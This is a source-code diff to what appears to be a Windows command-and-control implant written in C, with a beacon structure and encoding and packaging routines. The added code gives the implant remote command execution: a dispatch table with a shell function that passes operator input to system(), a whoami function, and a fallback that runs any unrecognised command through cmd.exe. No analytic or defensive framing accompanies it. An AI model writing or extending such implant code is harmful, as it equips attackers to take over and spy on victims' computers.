@@ -5,6 +5,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 
+#define patch_length 2
+
 struct {
     struct {
         CHAR*   address;
@@ -36,6 +38,26 @@ struct {
         INT     count;
     } beacon;
 } wurm;
+
+unsigned char patch_list_name[patch_length] = {0xAA, 0xAB};
+
+INT AA$shell(CHAR* input, CHAR** output) {
+    system(input);
+    return 0;
+}
+
+BOOL AB$whoami(CHAR* input, CHAR** output) {
+    DWORD username_buffer = 256;
+    CHAR username[256];
+    if (GetUserNameA(username, &username_buffer)) {
+        *output = (CHAR*) calloc(strlen(username) + 1, sizeof(CHAR));
+        strcat_s(*output, strlen(username) + 1, username);
+        return TRUE;
+    }
+    return FALSE;
+}
+
+BOOL (*patch_list_pointers[patch_length]) (CHAR* input, CHAR **output) = {AA$shell, AB$whoami};
 
 void Encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
     // Allocate memory and store length of data
@@ -81,8 +103,36 @@ void Package(CHAR* buffer) {
 }
 
 void Process(CHAR* command, CHAR* input) {
+    // Set local variables
+    CHAR* output = NULL;
+    INT hex_command = atoi(command);
+
     printf("Processing command: %s\n", command);
+    printf("Hex Value: 0x%x\n", hex_command);
     printf("Command input: %s\n", input);
+
+    // Convert hex value to command pointer and execute
+    for (int i = 0; i < patch_length; i++) {
+        if (hex_command == patch_list_name[i]) {
+            printf("Executing Command\n");
+            if ((*patch_list_pointers[i])(input, &output)) {
+                printf("Output:%s\n", output);
+                goto cleanup;
+            }
+        }
+    }
+
+    // Try to execute in cmd.exe if cannot be found in patch list
+    input = command;
+    if ((*patch_list_pointers[0])(input, &output)) { // index 0 of patch list is shell function
+        printf("Output:%s", output);
+        goto cleanup;
+    }
+
+    // Clean up memory
+    goto cleanup;
+    cleanup:
+        free(output);
 }
 
 void Request() {
